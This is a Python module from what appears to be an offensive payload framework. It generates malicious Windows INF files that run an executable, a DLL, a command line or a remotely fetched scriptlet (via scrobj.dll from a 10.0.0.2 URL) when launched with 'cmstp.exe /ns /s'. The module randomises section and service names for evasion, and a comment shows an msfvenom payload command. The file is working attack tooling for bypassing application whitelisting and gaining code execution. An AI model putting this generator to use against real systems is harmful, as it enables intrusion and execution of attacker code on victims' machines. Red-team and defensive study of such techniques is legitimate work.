#!/usr/bin/env python
# encoding: utf-8

import logging
from modules.payload_builder import PayloadBuilder
from common.utils import randomAlpha, MPParam, getParamValue

INF_TEMPLATE = \
r"""

[version]
Signature="$Windows NT$"

[DefaultInstall_SingleUser]
<<<SECTION_TYPE>>>=<<<SECTION_NAME>>>

[<<<SECTION_NAME>>>]
<<<TARGET_PATH>>>

[Strings]
ServiceName="<<<SERVICE_NAME>>>"
ShortSvcName="<<<SERVICE_NAME>>>"
"""

class InfGenerator(PayloadBuilder):
    """
     Module used to generate malicious Windows Setup information (INF)  File
     
     Based on information from:
     https://pentestlab.blog/tag/inf/
     https://bohops.com/2018/02/26/leveraging-inf-sct-fetch-execute-techniques-for-bypass-evasion-persistence/
     https://bohops.com/2018/03/10/leveraging-inf-sct-fetch-execute-techniques-for-bypass-evasion-persistence-part-2/
     
     Path can be sct  %11%\scrobj.dll,NI,http://10.0.0.2/tmp/pentestlab.sct
     
     Note about the %11%
     11: System directory. This is equivalent to %SystemRoot%\\system32 for Windows 2000 and later versions of Windows..
     (https://docs.microsoft.com/en-us/windows-hardware/drivers/install/using-dirids)
     
     
     http://www.mdgx.com/INF_web/advinf.htm
     http://www.mdgx.com/INF_web/regocx.htm
     
     [RegisterOCXSection]
     %&ltLDID>%\&ltsubdir>\&ltOCX file name>,<flag,<parameter>>
     
     
     
     http://www.mdgx.com/INF_web/presetup.htm
     RunPreSetupCommands=RunPreSetupCommandsSection

    [RunPreSetupCommandsSection]
    ; Commands Here will be run Before Setup Begins to install
     
     """
    
    def check(self):
        self.targetPath = ""
        if not self.mpSession.htaMacro:
            dictKey = "Target path (.exe, .dll, .sct) or command line"
            paramArray = [MPParam(dictKey)]
            self.fillInputParams(paramArray)

            if self.targetPath.lower().endswith(".dll"):
                self.targetPath = getParamValue(paramArray, dictKey)
            elif str(self.targetPath).lower().endswith(".sct"):
                self.targetPath = getParamValue(paramArray, dictKey)
            elif str(self.targetPath).lower().endswith(".exe"):
                self.targetPath = getParamValue(paramArray, dictKey)
            else:
                self.mpSession.dosCommand = getParamValue(paramArray, dictKey)

        return True
        
        
    
    def generate(self):
        logging.info(f" [+] Generating {self.outputFileType} file...")
        # Fill template
        infContent = INF_TEMPLATE

        if self.mpSession.dosCommand:
            logging.warning("   [-] Target is command line.")
            infContent = infContent.replace("<<<TARGET_PATH>>>", self.mpSession.dosCommand)
            infContent = infContent.replace("<<<SECTION_TYPE>>>", "RunPreSetupCommands") 

        elif str(self.targetPath).lower().endswith(".dll"):
            logging.info("   [-] Target is DLL...")
                # Ex to generate calc launching dll (OCX payload for 64bit PC:
                # msfvenom -p windows/x64/exec cmd=calc.exe -f dll -o calc64.dll
            infContent = infContent.replace("<<<TARGET_PATH>>>", f"{self.targetPath}")
            infContent = infContent.replace("<<<SECTION_TYPE>>>", "UnRegisterOCXs")
        elif str(self.targetPath).lower().endswith(".sct"):
            logging.info("   [-] Target is Scriptlet file...")
            infContent = infContent.replace("<<<TARGET_PATH>>>", "%%11%%\\scrobj.dll,NI,%s" % self.targetPath)
            infContent = infContent.replace("<<<SECTION_TYPE>>>", "UnRegisterOCXs")
        elif str(self.targetPath).lower().endswith(".exe"):
            logging.info("   [-] Target is exe file...")
            infContent = infContent.replace("<<<TARGET_PATH>>>", self.targetPath)
            infContent = infContent.replace("<<<SECTION_TYPE>>>", "RunPreSetupCommands")
        else:
            logging.warning("   [!] Could not recognize extension, assuming executable file or command line.")
            infContent = infContent.replace("<<<TARGET_PATH>>>", self.mpSession.dosCommand)
            infContent = infContent.replace("<<<SECTION_TYPE>>>", "RunPreSetupCommands")
        # Randomize mandatory info    
        infContent = infContent.replace("<<<SECTION_NAME>>>", randomAlpha(8))
        infContent = infContent.replace("<<<SERVICE_NAME>>>", randomAlpha(8))

        with open(self.outputFilePath, 'w') as f:
            f.writelines(infContent)
        logging.info(
            f"   [-] Generated {self.outputFileType} file path: {self.outputFilePath}"
        )

        logging.info("   [-] Test with : cmstp.exe /ns /s %s\n" % self.outputFilePath)
        

        
        
        